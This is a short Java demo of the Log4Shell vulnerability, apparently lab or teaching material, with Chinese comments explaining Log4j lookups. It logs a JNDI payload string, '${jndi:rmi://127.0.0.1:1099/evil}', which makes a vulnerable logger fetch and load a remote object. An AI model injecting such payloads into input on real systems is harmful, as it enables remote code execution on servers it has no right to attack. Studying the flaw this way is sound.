import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;

/**
 * 被攻击端服务
 */
public class MainService {
    public static final Logger LOGGER = LogManager.getLogger(MainService.class);
    public static void main(String[] args) {
        String username = "cosmos";
        LOGGER.error("日志记录,{}",username);
        //log4j的lookup功能,可通过${}调用一些函数
        username = "${java:os}";
        LOGGER.error("日志记录,{}",username);
        //当调用jndi远程获取资源的时候就会出现漏洞
        username = "${jndi:rmi://127.0.0.1:1099/evil}";
        LOGGER.error("日志记录,{}",username);
    }
}
